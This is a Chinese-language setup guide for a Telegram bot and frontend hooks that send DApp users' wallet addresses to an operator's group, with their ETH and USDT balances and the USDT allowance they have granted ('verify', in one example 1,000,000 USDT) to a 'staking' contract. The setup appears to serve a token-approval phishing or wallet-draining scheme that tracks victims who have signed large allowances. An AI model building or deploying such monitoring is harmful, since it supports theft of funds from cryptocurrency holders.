# 🚀 Telegram机器人快速设置指南

## 📋 设置步骤

### 1. 创建Telegram机器人

1. **找到BotFather**
   - 在Telegram中搜索 `@BotFather`
   - 开始对话

2. **创建新机器人**
   ```
   /newbot
   ```

3. **设置机器人信息**
   - 输入机器人名称（例如：`DApp Monitor Bot`）
   - 输入机器人用户名（例如：`your_dapp_monitor_bot`）

4. **获取Bot Token**
   - 保存返回的Token：`123456789:ABCdefGHIjklMNOpqrsTUVwxyz`

### 2. 获取群组Chat ID

1. **创建Telegram群组**
   - 创建新群组或使用现有群组

2. **添加机器人到群组**
   - 将机器人添加为管理员
   - 确保机器人有发送消息权限

3. **获取Chat ID**
   - 在群组中发送任意消息
   - 访问：`https://api.telegram.org/bot<YourBOTToken>/getUpdates`
   - 查找 `"chat":{"id": -1001234567890}` 
   - Chat ID通常是负数

### 3. 配置环境变量

复制配置文件：
```bash
cp .env.example .env
```

编辑 `.env` 文件：
```env
# 从BotFather获得的Token
TELEGRAM_BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz

# 群组的Chat ID（负数）
TELEGRAM_CHAT_ID=-1001234567890

# 其他配置保持默认即可
ETH_RPC_URL=https://ethereum.publicnode.com
USDT_CONTRACT_ADDRESS=0xdAC17F958D2ee523a2206206994597C13D831ec7
STAKING_CONTRACT_ADDRESS=0x9773a5279603CE262e48bfE3be50033a98c0842F
WEBHOOK_PORT=3001
MONITOR_INTERVAL=30000
```

### 4. 启动机器人

```bash
# 开发测试模式
npm run dev

# 生产模式
npm start
```

### 5. 测试机器人

在Telegram群组中发送：
```
/start
```

应该收到机器人的欢迎消息。

## 🔧 前端集成

### 在您的DApp中添加以下代码：

```javascript
// 1. 创建Telegram机器人集成类
class TelegramBotIntegration {
  constructor(webhookUrl = 'http://localhost:3001') {
    this.webhookUrl = webhookUrl;
  }

  async notifyUserConnect(address, action = 'connect') {
    try {
      const response = await fetch(`${this.webhookUrl}/webhook/user-connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address, action })
      });
      console.log('✅ 用户事件已发送到Telegram');
    } catch (error) {
      console.error('❌ 发送失败:', error);
    }
  }

  async notifyUserDisconnect(address) {
    try {
      await fetch(`${this.webhookUrl}/webhook/user-disconnect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ address })
      });
    } catch (error) {
      console.error('❌ 发送失败:', error);
    }
  }
}

// 2. 初始化机器人集成
const telegramBot = new TelegramBotIntegration('http://your-server:3001');

// 3. 在钱包连接事件中调用
// 假设在您现有的钱包连接代码中添加：
const handleWalletConnect = async (address) => {
  // ... 您现有的连接逻辑
  await telegramBot.notifyUserConnect(address, 'connect');
};

// 4. 在用户verify后调用
const handleUserAuthorize = async (address) => {
  // ... 您现有的verify逻辑  
  await telegramBot.notifyUserConnect(address, 'authorize');
};

// 5. 在钱包断开时调用
const handleWalletDisconnect = async (address) => {
  // ... 您现有的断开逻辑
  await telegramBot.notifyUserDisconnect(address);
};
```

## 🧪 测试

运行测试脚本：
```bash
npm run test
```

或手动测试：
```bash
# 测试用户连接
curl -X POST http://localhost:3001/webhook/user-connect \
  -H "Content-Type: application/json" \
  -d '{"address":"0x1234567890123456789012345678901234567890","action":"connect"}'

# 查看机器人状态
curl http://localhost:3001/api/status
```

## 🎯 预期效果

当用户操作时，Telegram群组会收到类似这样的消息：

```
🔗 新用户连接

👤 钱包地址: 0x1234...7890
💰 ETH余额: 0.1234 ETH  
💵 USDT余额: 1000.5678 USDT
🔑 verify额度: 1000000.0000 USDT
⏰ 更新时间: 2024-01-01 12:00:00

✅ 已verify质押合约
```

## ❓ 常见问题

**Q: 机器人无法发送消息**
A: 检查Bot Token是否正确，机器人是否已添加到群组并有发送权限

**Q: 获取不到Chat ID**
A: 确保在群组中发送了消息，然后访问getUpdates API

**Q: Webhook无响应**
A: 检查端口3001是否被占用，防火墙是否开放

**Q: 无法获取用户余额**
A: 检查ETH_RPC_URL是否可访问，网络连接是否正常

## 🔒 生产部署建议

1. **使用HTTPS** - 配置SSL证书
2. **设置反向代理** - 使用Nginx
3. **使用进程管理** - PM2或Docker
4. **监控日志** - 设置日志轮转
5. **备份配置** - 定期备份.env文件

---

🎉 **现在您就可以实时监控DApp用户的所有活动了！**



